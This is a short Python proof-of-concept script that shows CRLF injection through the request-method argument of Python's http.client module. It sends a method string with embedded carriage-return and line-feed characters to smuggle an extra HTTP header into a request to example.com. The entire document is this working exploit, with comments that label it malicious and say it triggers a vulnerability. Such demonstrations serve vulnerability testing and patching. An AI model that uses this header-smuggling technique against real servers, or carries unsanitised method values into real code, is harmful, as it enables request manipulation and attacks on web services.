# Import the http.client module
import http.client

# Create an HTTP connection object
conn = http.client.HTTPConnection("example.com")

# Define a malicious HTTP request method
# This method has CR and LF characters
# These characters will inject additional HTTP headers
method = "GET\r\nX-Injected-Header: foo\r\n"

# Define a URL path to send the request to
path = "/"

# Send the request with the malicious method
# This will trigger the vulnerability in the http.client module
# The server will receive the injected header
conn.request(method, path)